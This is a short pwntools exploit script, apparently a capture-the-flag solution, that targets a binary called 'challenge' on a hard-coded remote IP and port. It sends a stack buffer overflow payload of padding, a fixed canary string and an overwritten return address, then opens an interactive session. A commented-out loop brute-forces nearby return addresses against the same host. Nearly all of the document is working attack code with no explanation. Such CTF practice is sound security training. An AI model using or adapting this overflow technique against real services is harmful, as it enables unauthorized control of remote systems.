from pwn import *
# if args.REMOTE:
#     io = remote(sys.argv[1],sys.argv[2])
# else:
#     io = process("./challenge", )
elf = context.binary = ELF("./challenge", checksec=False)
context.log_level = 'info'

# pause()

io = remote('34.125.199.248',5674)

offset = b'A'*32
canary = b'NECGLSPQAA'
payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANECGLSPQAAAAAAAAAAAAAAAA' +p32(0x8049336)
io.recvuntil(b'> ')
io.sendline(str(len(payload)))
io.recvuntil(b'> ')
io.sendline(payload)
# print(io.recvline())
# print(io.recvline())
io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANECGLSPQAAAAAAAAAAAAAAAA')
# smtg = unpack(io.recv(4).ljust(4,b'\x00'))
# print(f"smtg: {hex(smtg)}")
io.interactive()

# for i in range(0xfff):
#     try: 
#         io = remote('34.125.199.248',5674)

#         payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANECGLSPQAAAAAAAAAAAAAAAA' + p32(0x8049336+i)
#         io.recvuntil(b'> ')
#         io.sendline(str(len(payload)))
#         # io.recvline()
#         # io.recvline()
#         # sleep(1)
#         io.recvuntil(b'> ')
#         io.sendline(payload)
#         print(io.recvline())
#         print(io.recvline())
#         print(io.recvline())
#         # io.recvuntil(b'NECGLSPQAAAAAAAAAAAAAA')
#         # smtg = unpack(io.recv(4).ljust(4,b'\x00'))
#         # print(f"smtg: {hex(smtg)}")
#         sleep(1)
#     except Exception as e:
#         pass



'''
aaaabaaacaaadaaaeaaafaaagaaahaaaNECGLSPQaaaabaaacaaadaaaeaaafaaagaaahaaa

'''